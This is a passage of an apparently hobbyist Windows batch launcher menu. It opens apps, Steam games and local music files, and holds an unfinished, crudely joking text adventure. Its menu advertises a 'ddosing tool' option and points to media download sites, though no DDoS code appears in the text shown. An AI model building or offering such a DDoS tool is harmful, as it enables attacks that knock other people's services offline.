echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9k







































:musicplayer
echo.
echo please insert the number of the song you want
echo back-(back)
echo exit-(exit)
echo tales from the borderlands-kiss the sky     (1)
echo tales from the borderlands-my silver lining (2)
echo ed sheeran-castle on the hill               (3)
echo ed sheeran-shape of you                     (4)
echo sia-move your body                          (5)
echo david guetta ft. sia-beautiful people say   (6)
echo david guetta-would i lie to you             (7)
echo carnage ft. timmy trumpet-toca bass boosted (8)
echo rocket league-seeing whats next             (9)
echo rocket league-we speak chinese              (10)
echo rocket league-solar eclipse                 (11)
echo the last of us 2-through the valley         (12)
echo alessia cara-scars to your beautiful        (13)
echo rag'n'bone man-human                        (14)
set /p mc=ENTER:
if %mc%== 1 goto m1
if %mc%== 2 goto m2
if %mc%== 3 goto m3
if %mc%== 4 goto m4
if %mc%== 5 goto m5
if %mc%== 6 goto m6
if %mc%== 7 goto m7
if %mc%== 8 goto m8
if %mc%== 9 goto m9
if %mc%== 10 goto m10
if %mc%== 11 goto m11
if %mc%== 12 goto m12
if %mc%== 13 goto m13
if %mc%== 14 goto m14
if %mc%== exit goto exit
if %mc%== back goto hl9k

:m1
start C:\Users\"fico pico"\Music\music\"Tales from the borderlands episode 2 intro song-Shawn Lee's Ping Pong Orchestra feat. Nino Mochella - Kiss The Sky.mp3"
pause
goto musicplayer
:m2
start C:\Users\"fico pico"\Music\music\"Tales From The Borderlands Episode 5 End Credits Song (My Silver Lining).mp3"
pause
goto musicplayer
:m3
start C:\Users\"fico pico"\Music\music\"Ed Sheeran - Castle On The Hill Official Lyric Video (1).mp3"
pause
goto musicplayer
:m4
start C:\Users\"fico pico"\Music\music\"Ed Sheeran - Shape Of You Official Lyric Video.mp3"
pause
goto musicplayer
:m5
start C:\Users\"fico pico"\Music\music\"Sia - Move Your Body (Alan Walker Remix) Audio.mp3"
pause
goto musicplayer
:m6
start C:\Users\"fico pico"\Music\music\"David Guetta - Beautiful People Say ft. Sia Lyrics (1).mp3"
pause
goto musicplayer
:m7
start C:\Users\"fico pico"\Music\music\"David Guetta_ Cedric Gervais & Chris Willis - Would I Lie To You (Lyric Video) (1).mp3"
pause
goto musicplayer
:m8
start C:\Users\"fico pico"\Music\music\"Carnage feat. Timmy Trumpet & KSHMR - Toca Bass Boosted (1).mp3"
pause
goto musicplayer
:m9
start C:\Users\"fico pico"\Music\music\"Seeing What's Next.mp3"
pause
goto musicplayer
:m11
start C:\Users\"fico pico"\Music\music\"Rocket League Music Solar eclipse.mp3"
pause
goto musicplayer
:m10
start C:\Users\"fico pico"\Music\music\"We speak Chinese-Rocket League OST.mp3"
pause
goto musicplayer
:m12
start C:\Users\"fico pico"\Music\music\"The Last Of Us Part II-Ashley Johnson (Ellie) - Through The Valley Extended Version.mp3"
pause
goto musicplayer
:m13
start C:\Users\"fico pico"\Music\music\"Alessia Cara - Scars To Your Beautiful (Audio).mp3"
pause
goto musicplayer
:m14
start C:\Users\"fico pico"\Music\music\"Rag'n'Bone Man - Human (Rudimental Remix) Official Video.mp3"
pause
goto musicplayer

:menu
echo.
cls 
echo Loading.. 
ping localhost -n 2 >nul 
cls 
echo Loading... 
ping localhost -n 2 >nul 
cls 
echo Connected 
pause
echo welcome to The Advanture
echo begin (1)
echo exit  (2)
set /p menu=ENTER:
if %menu%== 1 goto home
if %menu%== 2 goto exit

:home
cls
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2 >nul
echo complete
cls
pause
echo.
echo -------------------------------------------------
echo       !W    E    L    C    O    M    E!
echo -------------------------------------------------
echo start     (1)
echo exit      (2)
echo settings  (3)
set /p chose=
if %chose%== 1 goto begin
if %chose%== 2 goto exit
if %chose%== 3 goto colors

:exit
exit

:colors
echo ----------------------------------------------------
echo        S    E    T    T    I    N    G    S
echo ----------------------------------------------------
echo please type in the color of your choosing
set /p clr=BLUE,RED,YELLOW,GREEN,PURPLE:
if %clr%== blue goto beginB
if %clr%== red goto beginR
if %clr%== yellow goto beginY
if %clr%== green goto beginG
if %clr%== purple goto beginP

:begin
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginB
color 03
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginR
color 04
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginG
color 02
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginY
color 06
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginP
color 05
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto prologue
if %chs%== 3 goto exit

:tutorial
echo the controls for this game are simple
echo when asked where to go type in the direction you want to go in
echo you can choose any direction but you cant go back
echo example:forward\left\right
echo as for fighting you use the numbers on your keyboard
echo example:attack1--key "1"
echo when your ready continue
echo continue (1)
echo exit     (2)
set /p chs2=
if %chs2%== 1 goto prolouge
if %chs2%== 2 goto exit

:prolouge
echo.
echo Narator:Hello,i am the narator
echo Narator:I will be guiding you through this "amaechoing" advanture
echo Narator:whell if it was amaechoing than it would have been text based 
echo Narator:never mind,you have been put in a scenario where you save the...world..
echo Narator:really...really!
echo Narator:Thats the best this fuck could do,i mean come on,again,a end of the world scenarion
echo Narator:Im out of here!
echo Narator:NARATOR Out!
echo type in start to whell...start
set /p chs3=
if %chs3%== start goto encounter
goto prologue
 
:encounter
 
                                 `                  
echo                             .+yhs:                
echo                          .+yhhhhhhh+-             
echo                       `/yhhhhhhhhhhhhy/`          
echo                    `/shhhhhhhhhhhhhhhhhhs:`       
echo                  :sddhhhhhhhhhhhhhhhhhhhhhh+-     
echo               -ohdoohdddhhhhhhhhhhhhhhhhhhhhhy/`  
echo            `/yds:.--.:sdddhhhhhhhhhhhhhhhhhhddd:  
echo          :sdy/` +soos/ `/ydddhhhhhhhhhhhhddddo:   
echo       .ohho.    /soos:    .+hddhhhhhhhddddy/:     
echo    `/yds:`       `..`        :sdddhhdddyooo:+.    
echo   `dyo` --:-:-.        .-:-:-- `oymdho///oyhhhy/  
echo    . :  /:+:+-:        :-+:/:/  : o++/+:-yhhhhhh- 
echo    :o+  oo::+/:        /++:/++  : ++yyhsohhhhhhho 
echo    ohho ./:+//:/        /://+:+` -`+hhhhhhhhhhhhho 
echo   :hhho `......`        .......  - yhhhhhhdhhhhhh+ 
echo   +hhho        :---::---:        -`hhhhhhhhhhhhhh- 
echo   +hhh+        +::://:::+        :`hhhhhhhhhhhhhy  
echo   /hhh+        +::://:::+        : yhhhhhhdhhhhh/  
echo   -hhh+        +::+o+/::+        : ohhhhhh/.-:-.   
echo    yhh+        +::://:::+        :.+hhhhhy`        
echo    :+oo------.-+::://:::+-----...+--/+o++-         
echo      .........----------........-   


echo          what a wonderfull day...
echo          lets go to work.
set /p drc=direction:
if %drc%==forwad goto work
if %drc%==left goto work
if %drc%==right goto work 

:work
echo.
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2>nul
cls
pause
echo ....`                                                     
echo              .+-/.--://--                                                 
echo              /..-::::::.+.                                                
echo              `+::-.``..-+                                                 
echo               +   ....+.                                                  
echo               +       .:                                                  
echo               +        +                                                  
echo              `/        o                                                  
echo              :.        o                                                  
echo              +         o`                                                 
echo              +         :-                                                 
echo              +         ./ ...-.`                                     .    
echo             `/          o-/-/-.o       .-:`   .::`  `-:/`  `::    .::-:`  
echo -.          s:- :  +-------`  -/::.  :/:-   :/:-  ::::`   `+: 
echo      `/+:-.-.+`         o .---++/:    -/+`   -/+`  `/+-    ::/`   -:-// / 
echo     :: -:-.--+:--.-----:.   ./.  .+`-/.  :-`/.  /-::  ./`::   /--:.+:`  / 
echo .+`o-.....--------......./....../:-----:/--:::/:::::://:::/:o-:-.    / 
echo    o  ++-------.....+    .------`   `o---------..............:-/``      + 
echo +``++.```````````s:://:---   .-. `+.......................--: `.... :- 
echo    o  +----------:/:`        -:`  `:.+-----------------------:.:---..-:o  
echo    o  +         /:             ::   /`    `+/:` :/:-`          :`//---``: 
echo    o``+       `+`               `/   +   `/`//`-/`o:`      ..` :`+:+/// + 
echo    o `+       +      `---..`     `+  -/``+ /...+`-:.-----.+:.s.:`/::/o:-- 
echo   `+.`+      +`    ::.  : `-:.    .:/....o -/::s``o---------:` : .+-:---  
echo /--   +      o   `+`    -    ::    /`-+:.o `/` :. +            : :-       
echo :-     +      o   +   --`-`--  +`   /  `: :. /  -- +            -/.        
echo ./     +     `+  `/   .- - -.  -:   /  .+-// o::/+.o------------:`         
echo .-----:::::::o..//....../---..:o---o//.   .-`    `                        
echo              ```````````````````````
echo. 
echo You:whell that was a nother day of work i guess...
echo You:bye everyone.
pause
goto apocolipse

:apocolipse
echo              .:syhhy:       
echo              ohysyooh+       
echo              `y+/+-+s`       
echo               .:/+::-        
echo :/+/:-`        `:s/-+//-`      
echo./smmmds     :/y/o//y+:/.     
echo   +sms/+..-:+:+---oo++-:-    
echo    :s//y:::++/o---os -o+/    
echo              ::--:hy/ .+/`   
echo              /ysoysy+  `::-. 
echo              odddddh   :/+s+ 
echo             :hhdhhhho    ..  
echo            .hhddsdhhh:       
echo            yhhdy .hhhd-      
echo           `hhdh+  .hhhd+     
echo            shddh+  .dhhd+    
echo            .hhhdh-  /dhhdy   
echo             :dddd:   yddds   
echo           :mmmNmd    oNNNy   
echo           -oo++-     smmdd-

echo     GIVE ME YOUR MONEY!
echo give money (1)
echo fight      (2)
set /p thg=ENTER:
if %thg%== 1 goto pussy1
if %thg%== 2 goto fight1

:pussy1
echo You:ok,ok...here you go,just dont hurt me...pls...
set /p drc1=DIRECTION:
if %drc1%==forward goto home1
if %drc1%==left goto home1
if %drc1%==right goto home1

:home1
echo.
echo whell that was a bad decision
echo i guess you cant go on the advanture now
echo bye you fuck
pause
goto exit

:fight1
cls
echo attack    (1)
echo pussy out (2)
set /p atc=ENTER:
if %atc%== 1 goto attack1
if %atc%== 2 goto pussy1
goto fight1

:attack1
cls
echo. 
echo Narator:You punched him in the balls as he screamed and ran away
echo Narator:you proudly went home with your money
echo.
echo Oh hey,im back btw.
echo explenation (1)
echo continue    (2)
set /p chs4=
if %chs4%== 1 goto explenation1
if %chs4%== 2 goto home1

:explenation1
echo.
echo Narator:whell you see...
echo Narator:i wasnt really allowed to go away
echo Narator:i kind of signed a contract
echo Narator:so i had to stay
echo Narator:never mind me,lets continue with the story
set /p chs5=Continue (Y/N):
if %chs5%== Y goto obduction
if %chs5%== N goto exit
goto explenation1

:obduction 
pause
echo.
echo                                                             
echo                                                                           
echo                                                                           
echo                               ```        `` `                             
echo                              `.```.`  `....::````                         
echo                         `         `---:.```````````                       
echo                       ``        ``//--/o-```````````                      
echo                      ``  ````````:sooo/so````````````                     
echo                 ```.`````....-++::sssssso-+o+.......``.``                 
echo           ``..--:://-..`````.+oosssssssssss/o:`````...////::-.`           
echo       `.----:://++++-```..-:++./yssssssssss..+/:-..``.++++++++//:-`       
echo   `.-:----//++++++++/-...--::--/sssssssssss------...-/+++++++++++++/:.`   
echo `-:-..-///:://++++++++/:--------+++++o++++/-------:/++++++++++////++++/:. 
echo./++//++++/:-::/+++++++++++//////////////////////++++++++++++/::--/+++oo+/.
echo  .:osyysoo+++++++++++++++++++++++/////+++++++++++++++++++++++++oosyys+:.  
echo     `-/oyyhyyysooo++++++++++++++/-.-::/+++++++++++++++++ossyhhhhy+:.`     
echo         `.:+syyhhhyyyyssooo+++++++++++++++++++ooosssyyyhhhhyo/-`          
echo              `.-/+osyhhhhhhhhyyyyyyyyyyyyyyyhhhhhhhhho+/-.`               
echo                    -yhhhhhhhhhhhhhhhhhhhhhhhhdddddd+                     
echo                     `/syhhhhhhhhhhhhhhhhhhddddddhs-                      
echo                        `-/oyyyhhhhhhhhhhhhhddhyo:.                        
echo                             .-::/+++++++//:-.`       
echo.           
echo Alians:Hello
echo Alians:we are the intergalactic police force
echo Alians:we would like you to join us
echo Alians:we have seen your amaechoing balls punching
echo Alians:we have seen great potential 
echo Alians:we will take you
pause
goto obduction2

:obduction2
echo             `:/ooo`                                                       
echo          `+ydddmNmd:                                                      
echo          dNNNMMMMMNms`                                                    
echo          hMMMMMMMMMNmhosso+/.                                             
echo          oMMMMMMMMMMMdNmMMmhd/                                            
echo        `:yMMMMMMMMNhys+hmMmdh.                                            
echo      `omMMmNNNNNmdh/syhmmmd+`                                             
echo      dMMMMmddddddmmmmmmNNNmdho-```````                                    
echo      +dmNMMMMMMMMMNNmmmmmmmmmmmddddddddhs/`                               
echo       `..:dNNNNNmmmmmmmmNNNNNNNNNNNNNNNNNm+                               
echo         .hmmmmmmmNNNNNmmdddddddmNNNNNNNNdo`                               
echo      .:odmmNNNNNmddhhyhhhhyyyyssNNNNNdy/.                                 
echo   ./ydmNNNNNmdhyhhhhhhyyyyyyyyhdmmhs:.                                    
echo `odmNNNNNNNmoyyyyyyyysyyyyhhhhys++-                                       
echo oNNNNNNNNNNmhhhhyhhhhhhyyso++//////:`                                     
echo .ohddddddddddhyyysoo++//////////////:-`                                   
echo    ``......``` .://///////////////////:.                                  
echo                 .://////////////////////:.                                
echo                  `:///////////////////////-`                              
echo                   `:///////////////////////:-`                            
echo                    `:////////////////////////:.                           
echo                     `://///////////////////////:`                         
echo                      -//////////////////////////-`                       
echo                        -//////////////////////////:.                      
echo `   `  `   `  `   `      -///////////////////////////:.                    
echo ::++os+ssooysshhyhhhys+odhdddddddddddddhhmddmdhmmdddhdhsyysso++++++++//:::.
echo.
echo human has been acquired!
echo ALIANS Out!
pause
goto spaceship

:spaceship
echo.
echo Comander:welcome human
echo Comander:we are Banakafalatans
echo Comander:we have TAKEN you
echo Billy:omfg its like that movie we saw last night
echo Comander:Billy shut it
echo Comander:The subject isnt apropriate
echo Comander:Nevermind Billy please
echo Comander:You will be taken for examination
echo Comander:afterwords if the producers have enough money
echo Comander:Will put you on a space advanture
pause
goto spaceadvanture

:spaceadvanture
echo Comander:you will be traned as the best
echo Comander:you will be seen as one of ours
echo Comander:there will be no compremises
echo Trainer:come with me
echo I will be training you
echo first you need to choose a weapon
echo Standard Blaster (1)/(4-preview)
echo Laser Sword      (2)/(4-preview)
echo Advanced Blaster (3)/(4-preview)
set /p chs6=
if %chs6%== 1 goto stb
if %chs6%== 2 goto lsw
if %chs6%== 3 goto adb
if %chs6%== 4 goto preview1

:lsw
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc2
goto stb

:stb
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc
goto stb

:adw
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc3
goto adw

:trc3
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck20=Enter:
if %atck20%== 1 goto atc20
if %atck20%== 2 goto atc21
goto trc

:atc20 
echo Dummy health:100-65
echo standard attack (1)
echo advanced attack (2)
set /p atck21=Enter:
if %atck21%== 1 goto atc23
if %atck21%== 2 goto atc25

:atc21
echo Dummy health:100-65+10(ice ammo)
echo standard attack (1)
echo advanced attack (2)
set /p atck22=Enter:
if %atck22%== 1 goto atc26
if %atck22%== 2 goto atc27

:atc26
echo Dummy health:25-65
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt23=(Y/N):
if %cnt23%= Y goto spaceadvanture2
if %cnt23%= N goto exit
goto atc22 

:atc27
echo Dummy health:25-65+10(ice ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt24=(Y/N):
if %cnt24%= Y goto spaceadvanture2
if %cnt24%= N goto exit
goto atc12

:atc23
echo Dummy health:35-65
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt25=(Y/N):
if %cnt25%= Y goto spaceadvanture2
if %cnt25%= N goto exit
goto atc22 

:atc25
echo Dummy health:35-65+10(ice ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt26=(Y/N):
if %cnt26%= Y goto spaceadvanture2
if %cnt26%= N goto exit
goto atc12

:trc2
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck2=Enter:
if %atck2%== 1 goto atc3
if %atck2%== 2 goto atc4
goto trc

:atc3 
echo Dummy health:100-40
echo standard attack (1)
echo advanced attack (2)
set /p atck3=Enter:
if %atck3%== 1 goto atc13
if %atck3%== 2 goto atc23

:atc4
echo Dummy health:100-40+10(fire ball)
echo standard attack (1)
echo advanced attack (2)
set /p atck=Enter:
if %atck4%== 1 goto atc14
if %atck4%== 2 goto atc24

:atc24
echo Dummy health:60-40+10(fire ball)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt8=(Y/N):
if %cnt8%= Y goto spaceadvanture2
if %cnt8%= N goto exit
goto atc22 

:atc14
echo Dummy health:50-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt9=(Y/N):
if %cnt9%= Y goto spaceadvanture2
if %cnt9%= N goto exit
goto atc12

:atc23
echo Dummy health:50-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt10=(Y/N):
if %cnt10%= Y goto spaceadvanture2
if %cnt10%= N goto exit
goto atc22 

:atc13
echo Dummy health:60-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt11=(Y/N):
if %cnt11%= Y goto spaceadvanture2
if %cnt11%= N goto exit
goto atc12

:trc
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck=Enter:
if %atck%== 1 goto atc1
if %atck%== 2 goto atc2
goto trc

:atc1 
echo Dummy health:100-45
echo standard attack (1)
echo advanced attack (2)
set /p atck12=Enter:
if %atck12%== 1 goto atc12
if %atck12%== 2 goto atc22

:atc2
echo Dummy health:100-45+10(fire ammo)
echo standard attack (1)
echo advanced attack (2)
set /p atck13=Enter:
if %atck13%== 1 goto atc15
if %atck13%== 2 goto atc25

:atc25
echo Dummy health:55-45+10(fire ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt14=(Y/N):
if %cnt14%= Y goto spaceadvanture2
if %cnt14%= N goto exit
goto atc22 

:atc15
echo Dummy health:45-45
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt15=(Y/N):
if %cnt15%= Y goto spaceadvanture2
if %cnt15%= N goto exit
goto atc12

:atc22
echo Dummy health:55-45+10(fire ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt16=(Y/N):
if %cnt16%= Y goto spaceadvanture2
if %cnt16%= N goto exit
goto atc22 

:atc12
echo Dummy health:55-45
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt17=(Y/N):
if %cnt17%= Y goto spaceadvanture2
if %cnt17%= N goto exit
goto atc12

:preview1
echo (1)-standar blaster
echo (2)-laser sword
echo (3)-advanced blaster
set /p chs7=Enter:
if %chs7%== 1 goto preview2
if %chs7%== 2 goto preview3
if %chs7%== 3 goto preview4

:preview3
cls
echo          D  M  G:40
echo          S P E T I A L:fire ball 
echo.
echo                                   
echo                                                  ````````                 
echo                                              ```...----..`                
echo                                            `..----------.`                
echo                                         ``..------------.`                
echo                                       ``..-----....-----.`                
echo                                     ``..-----..``.-----.``                
echo                                   ``..--:---.``..-----.``                 
echo                                  `..-:::--.``..------.``                  
echo                                ``.-::::-.```..-----..`                    
echo                              ``.--:::-..``..--:---.``                     
echo                             `..-:::--.``..--:::-..`                       
echo                           ``.-::::-.```.--:::--.``                        
echo                          `.--:::-.```..-::::-.``                          
echo                        ``.--::--.```.--:::--.`                            
echo                       `..-::--.```.--:::--.``                             
echo                     ``.-----.```..-::::-.``                               
echo                    .:..---.```..--:::-..`                                 
echo                    `+o:-:.```.--:::--.`                                   
echo                     `-oo///-------..``                                    
echo                     `.+/+yo-.....``                                       
echo                    `::/o::-+o/.`                                          
echo                   .:/+/`    ```                                           
echo                  -/+-                                                     
echo               `:oo-                                                       
echo               `//-  
pause
goto spaceadvanture                                                      
                                                           
:preview2
cls
echo          D  M  G:45
echo          S P E T I A L:fire ammo
echo.
echo                                                                   
echo                   .-:`  ```                                               
echo       ```````.--:/yyyyosyyyo.````                                         
echo      /yyyyssyhhhhhhyyyhhddhs.```        ``                                
echo      -yyhhysssdmdosyyyoohhs``..--:://+osyo/``````........-------.....     
echo      `////.``.yhhhhhhhhhhyyyyyyyyyyyyhhddyyysys------..........------`    
echo        .sysyyyhhhhhhhhdddddhhhhhyoo+++syyyyyyyy:----::::::::::--.``       
echo    -oosshhhddddhhhhhhyyyyyyyyyyo//++++shhhyyyss/:---...`````              
echo    oyyhyyhyyyyhhhhhhhhhhhddddddyyy+--....``                               
echo    sdddddmdmdyssoyhydddhyhhyyy+/-/.                                       
echo    `ohyooo+/:    `yhdddyhhsoy-   `-                                       
echo     ```          `hdmdmhy-.-+. `..                                        
echo                 .yyyhdh:`   `.``                                          
echo                `hyyyyh-                                                   
echo               `hhyyyh-                                                    
echo               odyyyd-                                                     
echo               `+yhdd-                                                     
echo                  `..     
pause
goto spaceadvanture

:preview4                                                 
cls
echo          D  M  G:65    
echo          S P E T I A L:ice ammo
echo.
echo                       `::--..--..-+.`                                  
echo                        ``-ysydyyssyyyydo..```````                         
echo   ```     `://:///::/:oyyhoossdhdhyyhhmddddddhhhs/.``````..`              
echo  .yssssoo+yddyssyyyyyhmyhdyyhhdhdhhhyyhhyyyyyosyyhhyss++//++/-......`.``  
echo  :mhmmmmmmhh/://s///smmhhyhhyddddddhhhhhhyyysosysyysssoooso+y+++////-//:  
echo  +mhdmddddso/-::/--://++s+ssodmdyyhssysyyyyyssysddmmmmmmmdy-.```````````  
echo  sdyyhho:.`                `oyhhs-:``sssssooo/:-:--------:.               
echo `hhhhy:`                  `oyyyo.`.``-```````                             
echo  ....`                    +yhy+`                                          
echo                          `.:/`                                           
pause
goto spaceadvanture                                                                                                       

:spaceadvanture2
echo work in progres....
echo thank you for playing the closed alpha preview 
pause
exit

:viber1
start C:\Users\"fico pico"\AppData\Local\Viber\Viber.exe 
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:steam1
echo.
echo choose an option
echo start steam                               (1)
echo start Fallout New Vegas                   (2)
echo start Terraria                            (3)
echo start Castle Crashers                     (4)
echo start The Elder Scrolls V:Skyrim          (5) 
echo start Saints Row IV                       (6)
echo start Just Cause 2                        (7)
echo start Victor Vran                         (8)
echo start Left 4 Dead 2                       (9)
echo start Lego MARVEL Super Heroes            (10)
echo start Garry's Mod                         (11)
echo start Goat Simulator                      (12)
echo start A Story About My Uncle              (13)
echo start Scrap Mechanic                      (14)
echo start Borderlands:The Pre Sequel          (15)
echo start Hotline Miami                       (16)
echo start Dirt 3:Complete Edition             (17)
echo start Trine 2                             (18)
echo start One Finger Death Punch              (19)
echo start Castlevania:Lords of Shadow         (20)
echo start Far Cry 3                           (21)
echo start Super Meat Boy                      (22)
echo start Metal Gear Solid V:The Phantom Pain (23)
echo start The Witcher 3:Wild Hunt             (24)
echo start Euro Truck Simulator                (25)
echo start Battlefield 4                       (26)
echo start Crysis 3                            (27)
echo start Metro Last Ligh Redux               (28)
echo start Guacamelee Super Turbo Championship (29)
echo start Scribblenauts Unmasked              (30)
echo start Shadow Warrior 2                    (31)
echo start The Vanishing of Ethan Carter       (32)
echo start Tom Clancy's The Division           (33)
echo start Lego Batman 3                       (34)
echo start Just Cause 3                        (35)
echo start Rocket League                       (36)
echo start Tales from the Borderlands          (37)
echo start Sniper Elite 4                      (38)
set /p g=ENTER:
if %g%==1 goto steam2
if %g%==2 goto s2
if %g%==3 goto s3
if %g%==4 goto s4
if %g%==5 goto s5
if %g%==6 goto s6
if %g%==7 goto s7
if %g%==8 goto s8
if %g%==9 goto s9
if %g%==10 goto s10
if %g%==11 goto s11
if %g%==12 goto s12
if %g%==13 goto s13
if %g%==14 goto s14
if %g%==15 goto s15
if %g%==16 goto s16
if %g%==17 goto s17
if %g%==18 goto s18
if %g%==19 goto s19
if %g%==20 goto s20
if %g%==21 goto s21
if %g%==22 goto s22
if %g%==23 goto s23
if %g%==24 goto s24
if %g%==25 goto s25
if %g%==26 goto s26
if %g%==27 goto s27
if %g%==28 goto s28
if %g%==29 goto s29
if %g%==30 goto s30
if %g%==31 goto s31
if %g%==32 goto s32
if %g%==33 goto s33
if %g%==34 goto s34
if %g%==35 goto s35
if %g%==36 goto s36
if %g%==37 goto s37
if %g%==38 goto s38

:s1
start "C:\Program Files (x86)\Steam\Steam.exe"
pause
:s2
start steam://rungameid/22490 
pause
:s3 
start steam://rungameid/105600 
pause
:s4 
start steam://rungameid/204360
pause
:s5
start steam://rungameid/72850
pause
:s6
start steam://rungameid/206420
pause
:s7
start steam://rungameid/8190
pause
:s8
start steam://rungameid/345180
pause
:s9
start steam://rungameid/550
pause
:s10
start steam://rungameid/249130
pause
:s11
start steam://rungameid/4000
pause
:s12
start steam://rungameid/265930
pause
:s13
start steam://rungameid/32500
pause
:s14
start steam://rungameid/278360
pause
:s15
start steam://rungameid/387990
pause
:s16
start steam://rungameid/219150
pause
:s17
start steam://rungameid/321040
pause
:s18
start steam://rungameid/35720
pause
:s19
start steam://rungameid/264200
pause
:s20
start steam://rungameid/234080
pause
:s21
start steam://rungameid/220240
pause
:s22
start steam://rungameid/40800
pause
:s23
start steam://rungameid/287700
pause
:s24
start steam://rungameid/292030
pause
:s25
start steam://rungameid/227300
pause
:s26
start "D:\Program Files (x86)\Origin Games\Battlefield 4\BF4X86WebHelper.exe"
pause
:s27
start "D:\Program Files (x86)\Origin Games\Crysis 3\bin32\Crysis3.exe"
pause
:s28
start steam://rungameid/287390
pause
:s29
start steam://rungameid/275390
pause
:30
start steam://rungameid/249870
pause
:s31
start steam://rungameid/324800
pause
:s32
start steam://rungameid/400430
pause
:s33
start steam://rungameid/365590
pause
:s34
start steam://rungameid/313690
pause
:s35
start steam://rungameid/225540
pause
:s36
start steam://rungameid/252950
pause
:s37
start steam://rungameid/330830
pause
:s38
start steam://rungameid/312660
pause

:movie1
start telnet towel.blinkenlights.nl
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:skype1
echo.
start skype.exe 
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:mp3juices1
echo.
echo you have chosen musicfree
echo when the page opens type in the song you want in the search bar
echo then choose the song and click download  
start https://wwww.mp3juices.com/
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:youtube1
echo.
echo you have chosen youtube 
start https://www.youtube.com/
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:10youtube
echo.
echo you have chosen videodownloader
echo after the page has loaded
echo in the search bar type in the video you want to download
echo then select the format you want to download it in
start https://10youtube.com/
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:chrome1
echo.
